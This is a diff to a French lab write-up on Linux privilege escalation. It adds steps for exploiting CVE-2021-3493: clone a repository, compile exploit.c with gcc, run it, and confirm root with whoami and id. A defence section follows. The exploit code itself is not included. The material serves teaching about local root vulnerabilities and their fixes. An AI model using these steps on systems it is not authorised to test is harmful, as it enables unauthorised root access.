@@ -234,7 +234,38 @@ La vulnérabilité est liée à un problème de traitement de la mémoire, qui p
 
 Pour ce faire, nous aurons besoin de 2 paquets sur le système : ```git``` et ```gcc``` (gcc étant souvent installé par défaut).
 
-Nous utilisons [*ce script*](https://github.com/briskets/CVE-2021-3493)
+Nous utilisons [**ce script**](https://github.com/loicoddon/TP_be_root/scripts/exploit.c) qui nous permet de l'exploiter.
+Celui ci se trouve dans ce repository, on le récupère : 
+
+```bash
+git clone https://github.com/loicoddon/TP_be_root
+```
+
+Puis on le compile :
+
+```bash
+cd scripts/
+gcc exploit.c -o exploit
+```
+Avant d'exécuter on vérifie avec quel utilisateur nous sommes loggé :
+
+```bash
+whoami && id
+```
+
+Enfin on l'exécute : 
+
+```bash
+./exploit
+```
+
+Puis on vérifie de nouveau :
+
+```bash
+whoami && id
+```
+
+Cette fois nous voyons que nous ne sommes plus un utilisateur classique, mais bien root de la machine.
 
 ### Défense 3 : Erreur de mise à jours
 
